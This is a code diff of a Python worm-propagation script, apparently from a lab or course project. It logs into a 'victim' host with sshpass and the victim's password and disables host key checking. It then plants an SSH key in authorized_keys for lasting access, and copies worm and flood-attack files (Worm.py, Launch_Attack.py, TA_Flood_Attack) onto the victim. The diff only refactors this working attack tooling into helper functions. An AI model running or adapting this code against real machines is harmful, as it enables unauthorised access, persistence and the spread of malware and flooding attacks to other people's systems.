@@ -2,6 +2,7 @@ import os
 import sys
 
 victim, attacker = {}, {}
+NO_AUTHENTICATION = '-o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no'
 
 
 def set_up_ssh_key():
@@ -9,19 +10,7 @@ def set_up_ssh_key():
     command = 'ssh-keygen -f ~/.ssh/victim_key -q -N \"\"'
     os.system(command)
 
-    # Know the host of victim
-    command = 'sshpass -p {0} ssh -t {1}@{2} -p {3} -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o StrictHostKeyChecking=no \"test\"'.format(victim['password'],
-                                                                                                                                                  victim['name'],
-                                                                                                                                                  victim['ip'],
-                                                                                                                                                  victim['port'])
-    os.system(command)
-
-    # Send public key to the victim
-    command = 'sshpass -p {0} scp -P {1} ~/.ssh/victim_key.pub {2}@{3}:~/.ssh/'.format(victim['password'],
-                                                                                       str(victim['port']),
-                                                                                       victim['name'],
-                                                                                       victim['ip'])
-    os.system(command)
+    send_scp_command('~/.ssh/victim_key.pub', '~/.ssh/')
 
     # Concatenate public key to authorized keys
     command = 'cat ~/.ssh/victim_key.pub >> ~/.ssh/authorized_keys && ( chmod 600 ~/.ssh/authorized_keys )'
@@ -33,20 +22,25 @@ def send_worm_to_victim():
     command = 'mkdir /home/{0}/Worm_Attack'.format(victim['name'])
     send_ssh_command(command, isNeedPw=False)
 
-    os.system('scp -P {0} Worm.py {1}@{2}:/home/{1}/Worm_Attack'.format(victim['port'], victim['name'], victim['ip']))
-    os.system('scp -P {0} Launch_Attack.py {1}@{2}:/home/{1}/Worm_Attack'.format(victim['port'], victim['name'],
-                                                                                 victim['ip']))
-    os.system(
-        'scp -P {0} SetUp_Attack.py {1}@{2}:/home/{1}/Worm_Attack'.format(victim['port'], victim['name'], victim['ip']))
-    os.system(
-        'scp -P {0} TA_Flood_Attack {1}@{2}:/home/{1}/Worm_Attack'.format(victim['port'], victim['name'], victim['ip']))
-    os.system('scp -P {0} run.sh {1}@{2}:/home/{1}/Worm_Attack'.format(victim['port'], victim['name'], victim['ip']))
+    sendFiles = ['Worm.py', 'Launch_Attack.py', 'SetUp_Attack.py', 'TA_Flood_Attack']
+    for sendFile in sendFiles:
+        send_scp_command(sendFile, '/home/{0}/Worm_Attack'.format(victim['name']), isNeedPw=False)
 
 
 def send_ssh_command(command, isNeedPw=True):
     print('[Send SSH Command] ' + command)
-    sshCommand = 'sshpass -p {0} '.format(victim['password']) if isNeedPw else ''
+    sshCommand = 'sshpass -p \"{0}\" '.format(victim['password']) if isNeedPw else ''
     sshCommand += 'ssh -t {0}@{1} -p {2} \"{3}\"'.format(victim['name'], victim['ip'], victim['port'], command)
+
+    os.system(sshCommand)
+
+
+def send_scp_command(sendFile, directory, isNeedPw=True):
+    print('[Send SCP Command] ' + sendFile + ' -> ' + directory)
+    scpCommand = 'sshpass -p \"{0}\" '.format(victim['password']) if isNeedPw else ''
+    scpCommand += 'scp -P {0} {1} {2} {3}@{4}:{5}'.format(victim['port'], NO_AUTHENTICATION, sendFile, victim['name'], victim['ip'], directory)
+
+    os.system(scpCommand)
 
 
 def set_up_user():
